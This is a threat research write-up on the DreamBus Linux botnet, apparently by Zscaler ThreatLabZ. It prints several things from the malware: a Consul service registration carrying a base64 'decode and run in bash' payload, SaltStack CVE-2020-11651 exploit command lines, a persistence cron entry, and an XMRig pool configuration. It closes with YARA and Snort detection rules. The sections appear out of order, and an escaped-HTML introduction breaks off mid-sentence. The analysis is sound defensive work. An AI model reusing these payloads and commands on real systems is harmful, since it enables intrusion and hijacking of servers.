<p><span><span><span><span><span><span>The fourth registration request is identical to the second registration request, with the </span></span></span></span></span></span><span><span><span><span><em><span>TTL</span></em></span></span></span></span><span><span><span><span><span><span> field replaced with the </span></span></span></span></span></span><span><span><span><span><em><span>Interval</span></em></span></span></span></span><span><span><span><span><span><span> field.</span></span></span></span></span></span></p>

<pre>
<span><span><span><span><span><span>PUT</span></span></span></span></span></span><span><span><span><span><span><span> </span></span></span></span></span></span><span><span><span><span><span><span>/v1/agent/service/register</span></span></span></span></span></span><span><span><span><span><span><span> </span></span></span></span></span></span><span><span><span><span><span><span>HTTP</span></span></span></span></span></span><span><span><span><span><span><span>/1.1</span></span></span></span></span></span>
<span><span><span><span><span><span>Host</span></span></span></span></span></span><span><span><span><span><span><span>:</span></span></span></span></span></span><span><span><span><span><span><span> %s:%d</span></span></span></span></span></span>
<span><span><span><span><span><span>User-Agent</span></span></span></span></span></span><span><span><span><span><span><span>:</span></span></span></span></span></span><span><span><span><span><span><span> consul-api-c</span></span></span></span></span></span>
<span><span><span><span><span><span>Content-Type</span></span></span></span></span></span><span><span><span><span><span><span>:</span></span></span></span></span></span><span><span><span><span><span><span> application/json</span></span></span></span></span></span>
<span><span><span><span><span><span>Content-Length</span></span></span></span></span></span><span><span><span><span><span><span>:</span></span></span></span></span></span><span><span><span><span><span><span> %d</span></span></span></span></span></span>

<span><span><span><span><span><span>{</span></span></span></span></span></span><span><span><span><span><span><span>&quot;ID&quot;</span></span></span></span></span></span><span><span><span><span><span><span>: </span></span></span></span></span></span><span><span><span><span><span><span>&quot;systemd-service&quot;</span></span></span></span></span></span><span><span><span><span><span><span>,</span></span></span></span></span></span><span><span><span><span><span><span>&quot;Name&quot;</span></span></span></span></span></span><span><span><span><span><span><span>: </span></span></span></span></span></span><span><span><span><span><span><span>&quot;systemd-service&quot;</span></span></span></span></span></span><span><span><span><span><span><span>,</span></span></span></span></span></span><span><span><span><span><span><span>&quot;Address&quot;</span></span></span></span></span></span><span><span><span><span><span><span>: </span></span></span></span></span></span><span><span><span><span><span><span>&quot;127.0.0.1&quot;</span></span></span></span></span></span><span><span><span><span><span><span>,</span></span></span></span></span></span><span><span><span><span><span><span>&quot;Port&quot;</span></span></span></span></span></span><span><span><span><span><span><span>: </span></span></span></span></span></span><span><span><span><span><span><span>8500</span></span></span></span></span></span><span><span><span><span><span><span>,</span></span></span></span></span></span><span><span><span><span><span><span>&quot;check&quot;</span></span></span></span></span></span><span><span><span><span><span><span>:{</span></span></span></span></span></span><span><span><span><span><span><span>&quot;script&quot;</span></span></span></span></span></span><span><span><span><span><span><span>: </span></span></span></span></span></span><span><span><span><span><span><span>&quot;echo WFJBTkRPTQpleGVjICY+L2Rldi...[snip]...UvZGVyZWdpc3Rlci9zeXN0ZW1kLXNlcnZpY2U7ZG9uZQpjb25zdWwgc2VydmljZXMgZGVyZWdpc3RlciAtaWQ9c3lzdGVtZC1zZXJ2aWNlCg==|base64 -d|bash&quot;</span></span></span></span></span></span><span><span><span><span><span><span>,</span></span></span></span></span></span><span><span><span><span><span><span>&quot;Interval&quot;</span></span></span></span></span></span><span><span><span><span><span><span>: </span></span></span></span></span></span><span><span><span><span><span><span>&quot;120s&quot;</span></span></span></span></span></span><span><span><span><span><span><span>}}</span></span></span></span></span></span></pre>

<p><span><span><span><span><span><span>After sending these four registration requests, the DreamBus Consul module will call the </span></span></span></span></span></span><span><span><span><span><em><span>deregister</span></em></span></span></span></span><span><span><span><span><span><span> command once again with the same parameters as described previously to clean itself up.</span></span></span></span></span></span></p>

<p><span><span><span><span><span><span><a href="https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations">HashiCorp has published an advisory</a> about the conditions, in which this vulnerability can be triggered, as well as guidance to secure a Consul instance.</span></span></span></span></span></span></p>

<p> </p>

<h3><strong><span><span><span><span><span><span>DreamBus SaltStack module</span></span></span></span></span></span></strong></h3>

<p><span><span><span><span><span><span>The most recent DreamBus module observed by Zscaler ThreatLabZ targets <a href="https://www.vmware.com/support/acquisitions/saltstack.html">SaltStack</a>, which is a Python-based open source IT automation framework.</span></span></span></span></span></span><span><span><span><span><span><span> The module exploits CVE-2020-11651, which is an authentication bypass that results in full remote command execution as root. <a href="https://labs.f-secure.com/advisories/saltstack-authorization-bypass">This exploit was originally described by F-Secure</a>, who found that there were 6,000 SaltStack servers that were exposed to the internet, and therefore, potentially vulnerable</span></span></span></span></span></span><span><span><span><span><span><span>.</span></span></span></span></span></span></p>

<p><span><span><span><span><span><span>The DreamBus module performs an initial check to make sure that <span>/usr/bin/curl</span> and <span>/usr/bin/python3</span> exist on the system and are executable. If they are not present, the module will exit. The module then scans for SaltStack servers on port 4506 on private subnets and the internet ranges 1.0.0.0/8 – 222.0.0.0/8</span></span></span></span></span></span></p>

<pre>
<span><span><span><span><span><span>GET</span></span></span></span></span></span><span><span><span><span><span><span> </span></span></span></span></span></span><span><span><span><span><span><span>/</span></span></span></span></span></span><span><span><span><span><span><span> </span></span></span></span></span></span><span><span><span><span><span><span>HTTP</span></span></span></span></span></span><span><span><span><span><span><span>/1.1</span></span></span></span></span></span>
<span><span><span><span><span><span>Host</span></span></span></span></span></span><span><span><span><span><span><span>:</span></span></span></span></span></span><span><span><span><span><span><span> 127.0.0.1</span></span></span></span></span></span></pre>

<p><span><span><span><span><span><span>The module checks if the server responds with the bytes <span>ff 00 00 00 00 00 00 00 01 7f</span>. These bytes are representative of the ZeroMQ protocol that is used by SaltStack.</span></span></span></span></span></span></p>

<p><span><span><span><span><span><span>If successful, the module will execute a series of commands. It will first create a directory under <span>/tmp/.salted/ </span>and write a Base64-encoded shell script named <span>x.pe</span> to this directory and execute it. This script performs a variety of actions. A Base64-encoded string is decoded and written to <span>e.py</span>. This is a Python script that contains a copy of an <a href="https://github.com/kevthehermit/CVE-2020-11651/blob/master/poc.py">open source proof-of-concept exploit</a> for this vulnerability</span></span></span></span></span></span><span><span><span><span><span><span>. Another shell script is created with the name <span>x.px</span> in the <span>/tmp/.salted/ </span>directory. This script contains the code to download the main DreamBus spreader from a hardcoded TOR domain with the path <span>/st.<arch></arch></span> if the exploit is successful. It will also attempt to delete the files <span>/etc/cron.d/tmp00</span> and <span>/tmp/.systemd-salt</span>. The script then writes the following lines for a cron job to a file named <span>x.pa</span>. </span></span></span></span></span></span></p>

<pre>
<span><span><span><span><span><span>* * * * * root /bin/bash /tmp/.systemd-salt</span></span></span></span></span></span></pre>

<p><span><span><span><span><span><span>Next, two shell commands attempt to install the Python packages: </span></span></span></span></span></span><span><span><span><span><em><span>msgpack</span></em></span></span></span></span><span><span><span><span><span><span> and </span></span></span></span></span></span><span><span><span><span><em><span>pyzmq</span></em></span></span></span></span><span><span><span><span><span><span>. These packages are dependencies required by the Python-based exploit script that launches the exploit. The Dreambus module launches the exploit three times with the following command lines:</span></span></span></span></span></span></p>

<pre>
<em><span><span><span><span><span><span>python3 e.py -p 4506 -w </span></span></span></span></span></span><span><span><span><span><span><span>/tmp/.systemd-salt</span></span></span></span></span></span><span><span><span><span><span><span> -f ./x.px </span></span></span></span></span></span><span><span><span><span><span><span>$1</span></span></span></span></span></span>
<span><span><span><span><span><span>python3 e.py -p 4506 -w </span></span></span></span></span></span><span><span><span><span><span><span>/etc/cron.d/tmp00</span></span></span></span></span></span><span><span><span><span><span><span> -f ./x.pa </span></span></span></span></span></span><span><span><span><span><span><span>$1</span></span></span></span></span></span>
<span><span><span><span><span><span>python3 e.py -p 4506 -c </span></span></span></span></span></span><span><span><span><span><span><span>&quot;echo WFJBTkRPTQpleGVjICY…[snip]...G9uZQo=|base64 -d|bash&quot;</span></span></span></span></span></span><span><span><span><span><span><span> -m </span></span></span></span></span></span><span><span><span><span><span><span>$1</span></span></span></span></span></span></em></pre>

<p><span><span><span><span><span><span>The first and second command launch the Python exploit script <span>e.py</span> with the same parameters: the port number of the SaltStack server (with the <span>-p </span>option), the file from the Salt Master to write (with the <span>-w</span> option), the content of the file to write (with the </span></span></span></span></span></span><span><span><span><span><span><span><span>-f</span> </span></span></span></span></span></span><span><span><span><span><span><span>option), and the IP address of the server to target. The differences between the two commands are that the first command writes the content of the file <span>x.px</span> to <span>/tmp.systemd-salt</span>, while the second command writes the content of the file <span>x.pa</span> to <span>/etc/cron.d/tmp00</span>. This allows DreamBus to establish persistence on the compromised SaltStack server.</span></span></span></span></span></span></p>

<p><span><span><span><span><span><span>The third command launches the exploit script with the port, a command to execute (with the <span>-c </span>option), a flag to run the command on all active minions (with the <span>-m</span> option), and the IP address of the SaltStack server. The command consists of the same Base64 encoded content as the file <span>x.px</span> that downloads the main Dreambus spreader module.</span></span></span></span></span></span></p>

<p><br/>
<span><span><span><span><span><span>Finally, the files <span>e.py</span> (the Python-based exploit script), <span>x.pa</span> (the temporary cron job), <span>x.pe</span> (the main Base64 encoded shell script), and <span>x.px</span> (main spreader module script) are deleted to hide the exploitation.</span></span></span></span></span></span></p>

<p> </p>

<h3><strong><span><span><span><span><span><span>Additional DreamBus modules</span></span></span></span></span></span></strong></h3>

<p><span><span><span><span><span><span>Prior open source reporting has also identified modules that have been deployed by DreamBus that target <a href="https://twitter.com/JiaYu_521/status/1152132886465638401">Apache Fink</a></span></span></span></span></span></span><span><span><span><span><span><span> and <a href="https://twitter.com/JiaYu_521/status/1263389123554848768">Jenkins</a></span></span></span></span></span></span><span><span><span><span><span><span>.</span></span></span></span></span></span></p>

<p> </p>

<h3><strong><span><span><span><span><span><span>DreamBus XMRig Monero miner module</span></span></span></span></span></span></strong></h3>

<p><span><span><span><span><span><span>The current monetization vector for DreamBus is through mining a cryptocurrency known as Monero (XMR), which is a popular alternative to Bitcoin due to its improvements in anonymity. At the time of publication, the value of Monero is up over 100 percent in the past year, further increasing the threat actor’s profits.</span></span></span></span></span></span></p>

<p><span><span><span><span><span><span>To mine Monero, DreamBus downloads an <a href="https://github.com/xmrig/xmrig">XMRig</a> module through the <span>/cpu</span> command. The XMRig module is compiled regularly with the most recent version, XMRig 6.7.1, built on January 15, 2021. The XMRig configuration specifies a mining pool to use the infected system’s CPU to mine Monero cryptocurrency. An example hardcoded configuration is shown below:</span></span></span></span></span></span></p>

<pre>
<em><span><span><span><span><span><span>{
    &quot;api&quot;: {
        &quot;id&quot;: null,
        &quot;worker-id&quot;: null
    },
    &quot;http&quot;: {
        &quot;enabled&quot;: false,
        &quot;host&quot;: &quot;127.0.0.1&quot;,
        &quot;port&quot;: 0,
        &quot;access-token&quot;: null,
        &quot;restricted&quot;: true
    },
    &quot;autosave&quot;: true,
    &quot;version&quot;: 1,
    &quot;background&quot;: true,
    &quot;colors&quot;: true, [snip]
    &quot;cpu&quot;: {

        &quot;yield&quot;: true,

        &quot;asm&quot;: true,
        &quot;argon2-impl&quot;: null,
        &quot;astrobwt-max-size&quot;: 550,
        &quot;cn/0&quot;: false,
        &quot;cn-lite/0&quot;: false,
        &quot;kawpow&quot;: false
    }, [snip]
    &quot;donate-level&quot;: 5,
    &quot;donate-over-proxy&quot;: 1,
    &quot;log-file&quot;: null,
    &quot;pools&quot;: [
        {
            &quot;algo&quot;: null,
            &quot;coin&quot;: &quot;monero&quot;,
            &quot;url&quot;: &quot;164.132.105.114:8080&quot;,
            &quot;user&quot;: &quot;x&quot;,
            &quot;pass&quot;: &quot;x&quot;,

    &quot;retries&quot;: 5,
    &quot;retry-pause&quot;: 5,
    &quot;syslog&quot;: false,
    &quot;user-agent&quot;: null,

}</span></span></span></span></span></span> </em>

<p> </p>

<h3><strong><span><span><span><span><span><span>Attribution</span></span></span></span></span></span></strong></h3>

<p><span><span><span><span><span><span>The threat actor behind DreamBus is likely located in or near Russia based on the time when new commands are pushed out. Updates and new commands are issued that typically start around 6:00 a.m. UTC or 9:00 a.m. Moscow Standard Time (MSK) and end approximately at 3:00 p.m. UTC or 6:00 p.m. MSK.</span></span></span></span></span></span></p>

<p> </p>

<h3><strong><span><span><span><span><span><span>Conclusion</span></span></span></span></span></span></strong></h3>

<p><span><span><span><span><span><span>While DreamBus is currently used for mining cryptocurrency, the threat actor could pivot to more disruptive activities such as ransomware. In addition, other threat groups could leverage the same techniques to infect systems and compromise sensitive information that can be stolen and easily monetized. The DreamBus threat actor continues to innovate and add new modules to compromise more systems, and regularly pushes out updates and bug fixes. The threat actor behind DreamBus is likely to continue activity for the foreseeable future hidden behind TOR and anonymous file-sharing websites. Therefore, organizations must be vigilant and take the necessary precautions to prevent infections.</span></span></span></span></span></span></p>

<p><span><span><span><span><span><span>There are a number of best practices that organizations can take to prevent attacks. These include properly securing all applications that are both publicly </span></span></span></span></span></span><span><span><span><span><em><span>and</span></em></span></span></span></span><span><span><span><span><span><span> privately accessible. Strong passwords should always be used to secure internet services, and SSH public key authentication can be further strengthened by requiring a password to decrypt the private key. Organizations should also deploy network and endpoint monitoring systems to identify compromises and be mindful of systems that engage in bruteforce attacks, which are typically very noisy.</span></span></span></span></span></span></p>

<p> </p>

<h4><strong><span><span><span><span><span><span>Yara rules</span></span></span></span></span></span></strong></h4>

<p><span><span><span><span><span><span>These rules are valid on unpacked DreamBus binaries.</span></span></span></span></span></span></p>

<p> </p>

<pre>
<span><span><span><span><span><span>rule dreambus_module</span></span></span></span></span></span>
<span><span><span><span><span><span>{</span></span></span></span></span></span>
<span><span><span><span><span><span>  strings:</span></span></span></span></span></span>
<span><span><span><span><span><span>    $ = &quot;/tmp/.X11-unix/22&quot;</span></span></span></span></span></span>
<span><span><span><span><span><span>    $ = &quot;172.16.0.0/12&quot;</span></span></span></span></span></span>
<span><span><span><span><span><span>    $ = &quot;192.168.0.0/16&quot;</span></span></span></span></span></span>
<span><span><span><span><span><span>    $ = &quot;10.0.0.0/8&quot;</span></span></span></span></span></span>
<span><span><span><span><span><span>  condition:</span></span></span></span></span></span>
<span><span><span><span><span><span>    all of them</span></span></span></span></span></span>
<span><span><span><span><span><span>}</span></span></span></span></span></span>


<span><span><span><span><span><span>rule dreambus_main</span></span></span></span></span></span>
<span><span><span><span><span><span>{</span></span></span></span></span></span>
<span><span><span><span><span><span>  strings:</span></span></span></span></span></span>
<span><span><span><span><span><span>    $ = &quot;/tmp/.X11-unix/01&quot;</span></span></span></span></span></span>
<span><span><span><span><span><span>    $ = &quot;/dev/null&quot;</span></span></span></span></span></span>
<span><span><span><span><span><span>    $ = {2D 63 00 2F 62 69 6E 2F 73 68 00}</span></span></span></span></span></span>
<span><span><span><span><span><span>    $ = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span></span></span></span></span>
<span><span><span><span><span><span>  condition:</span></span></span></span></span></span>
<span><span><span><span><span><span>    all of them</span></span></span></span></span></span>
<span><span><span><span><span><span>}</span></span></span></span></span></span></pre>

<p> </p>

<h4><strong><span><span><span><span><span><span>Snort rules</span></span></span></span></span></span></strong></h4>

<pre>
<span><span><span><span><span><span>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;Zscaler TROJAN DreamBus Command Request&quot;; flow:established,to_server; content:&quot;GET&quot;; http_method; content:&quot;/cmd&quot;; http_uri; content:&quot;User-Agent: -&quot;; http_header; classtype:trojan-activity; rev:1;)</span></span></span></span></span></span>

<span><span><span><span><span><span>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;Zscaler TROJAN DreamBus Command Request&quot;; flow:established,to_server; content:&quot;GET&quot;; http_method; content:&quot;/trc&quot;; http_uri; content:&quot;User-Agent: -&quot;; http_header; classtype:trojan-activity; rev:1;)</span></span></span></span></span></span>

<span><span><span><span><span><span>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;Zscaler TROJAN DreamBus Beacon Request&quot;; flow:established,to_server; content:&quot;GET&quot;; http_method; content:&quot;/bot&quot;; http_uri; content:&quot;User-Agent: -&quot;; http_header; classtype:trojan-activity; rev:1;)</span></span></span></span></span></span>

<span><span><span><span><span><span>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;Zscaler TROJAN DreamBus XMRig Request&quot;; flow:established,to_server; content:&quot;GET&quot;; http_method; content:&quot;/cpu&quot;; http_uri; content:&quot;User-Agent: -&quot;; http_header; classtype:trojan-activity; rev:1;)</span></span></span></span></span></span></pre>

ThreatLabZ research team recently analyzed a Linux-based malware family that we have dubbed the \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cem\u003e\u003cspan\u003eDreamBus Botnet\u003c/span\u003e\u003c/em\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e. The malware is a variant of \u003c/span\u003e\u003c/span\u003e\u003cem\u003e\u003cspan\u003eSystemdMiner\u003c/span\u003e\u003c/em\u003e\u003cspan\u003e\u003cspan\u003e, which consists of a series of Executable and Linkable Format (ELF) binaries and Unix shell scripts. Some components of the botnet have been analyzed in the past\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e with the malware dating back to early 2019. Many of the DreamBus modules are poorly detected by security products. This is in part because Linux-based malware is less common than Windows-based malware, and thus receives less scrutiny from the security community. However, many critical business systems run on Linux systems, and malware that is able to gain access to these systems can cause significant disruption and irreparable harm to organizations that fail to secure their servers properly.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe DreamBus malware exhibits worm-like behavior that is highly effective in spreading due its multifaceted approach to propagating itself across the internet and laterally through an internal network using a variety of methods. These techniques include numerous modules that exploit implicit trust, weak passwords, and unauthenticated remote code execution (RCE) vulnerabilities in popular applications, including Secure Shell (SSH), IT administration tools, a variety of cloud-based applications, and databases. These particular applications are targeted because they often run on systems that have powerful underlying hardware with significant amounts of memory and powerful CPUs—all of which allow threat actors to maximize their ability to monetize these resources through mining cryptocurrency. \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eWhile the primary DreamBus malware payload is an open source Monero cryptocurrency miner known as XMRig, the threat actor can potentially pivot in the future to carrying out more destructive activities, such as ransomware or stealing an organization’s data and holding it hostage.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eKey Points\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/strong\u003e\u003c/p\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eDreamBus is a modular Linux-based botnet with worm-like behavior that has been around at least since early 2019\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe malware can spread to systems that are not directly exposed to the internet by scanning private RFC 1918 subnet ranges for vulnerable systems\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eDreamBus uses a combination of implicit trust, application-specific exploits, and weak passwords to gain access to systems such as databases, cloud-based applications, and IT administration tools\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe botnet is currently monetized through leveraging infected systems to mine Monero cryptocurrency using XMRig\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe threat actor operating DreamBus appears to be located in Russia or Eastern Europe based on the time of deployment for new commands\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eTechnical analysis\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe Each DreamBus ELF binary is packed by \u003cspan\u003e\u003ca href=\"https://upx.github.io/\"\u003eUPX\u003c/a\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e with a modified header and footer. Example UPX header modified by DreamBus\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cbr\u003e\r\n\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eWhile this slight modification breaks the UPX command line tool, the ELF binary is still valid. Therefore, it can be unpacked and executed. This simple change may be sufficient to bypass some security software. Antivirus software often has low detection rates for DreamBus and its various modules. \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eDreamBus is designed to be portable across a range of Unix and Linux-based operating systems. To be as portable as possible, the malware downloads various dependencies and components if they are not present on the compromised system.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eBotnet architecture\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eDreamBus has a modular design with regular deployment of new modules and updates. Most command-and-control (C\u0026amp;C) components are hosted through TOR or on an anonymous file-sharing service such as \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003eoshi[.]at\u003c/span\u003e\u003cstrong\u003e \u003c/strong\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eand leverage the HTTP protocol. The malware name is derived from the prefix of the TOR domain \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003edreambusweduybcp[.]onion\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e that has been used for C\u0026amp;C communications since July 2019. Many DreamBus plugins share code, for example, to create a lock file named \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e22\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e in the directory \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e/tmp/.X11-unix/\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e and most set the name of the calling thread to \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003etracepath\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e. The first script is designed to set up a temporary directory that is used by the malware for lock files under \u003cspan\u003e/tmp/.X11-unix/\u003c/span\u003e. The DreamBus spreader module creates the lock file \u003cspan\u003e01\u003c/span\u003e in this directory. The malware then continues to execute a number of shell commands to set up the environment, and removes competing malware, other cryptocurrency miners, and cloud software. The shell scripts also define a set of variables and functions. DreamBus and its modules predominantly use cURL for network communications and set the HTTP user agent string to a hyphen (-) character. The shell scripts also define TOR domains that are used for C\u0026amp;C communications. Files extracted from the DreamBus SSH bruteforce module\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/em\u003e\u003cbr\u003e\r\n \u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe first file named \u003cspan\u003ess\u003c/span\u003e (not to be confused with the socket statistics application) is the open source tool Parallel Network Scanner (a.k.a., \u003cspan\u003epnscan\u003c/span\u003e) compiled as an ELF binary. \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe second file named \u003cspan\u003essh\u003c/span\u003e is another ELF binary based on the open source tool \u003cspan\u003esshpass\u003c/span\u003e that is designed to automate SSH authentication and shell script execution. The source code has been modified in several places including the supported command-line arguments to the following:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cem\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eUsage: sshpass address port username dict_file [threads=100]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/em\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eAll second-stage DreamBus plugins, including the SSH bruteforce module, create a lock file named \u003cspan\u003e22\u003c/span\u003e in the lock file directory \u003cspan\u003e/tmp/.X11-unix/\u003c/span\u003e. Upon a successful SSH login, the code also includes a Base64 encoded shell script that will be executed on the remote host. The shell commands will download and execute the main DreamBus spreader module via the path \u003cspan\u003e/sh.\u003carch\u003e\u003c/arch\u003e\u003c/span\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe \u003cspan\u003epw\u003c/span\u003e file contains a list of approximately 2,711 passwords that are used for the SSH bruteforce attack and passed to the \u003cspan\u003esshpass\u003c/span\u003e utility.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe script attempts to move laterally within a private internal network by first enumerating the system’s network adapters and searching for regexes that loosely match RFC 1918 IP address ranges. The code writes a shell command to a file named \u003cspan\u003er\u003c/span\u003e passing the \u003cspan\u003esshpass\u003c/span\u003e application along with a placeholder for an IP address to launch an SSH bruteforce attack against various usernames (e.g., \u003cspan\u003ehadoop, jenkins, kafka, postgres, redis, root, ubuntu, vagrant, varnish, and yarn\u003c/span\u003e), and the file \u003cspan\u003epw\u003c/span\u003e to use for the password dictionary. The pnscan tool \u003cspan\u003ess\u003c/span\u003e is then used to scan the internal subnets for online SSH servers and saved to a file named \u003cspan\u003eip\u003c/span\u003e. This file is then read by the script named \u003cspan\u003er\u003c/span\u003e to launch the 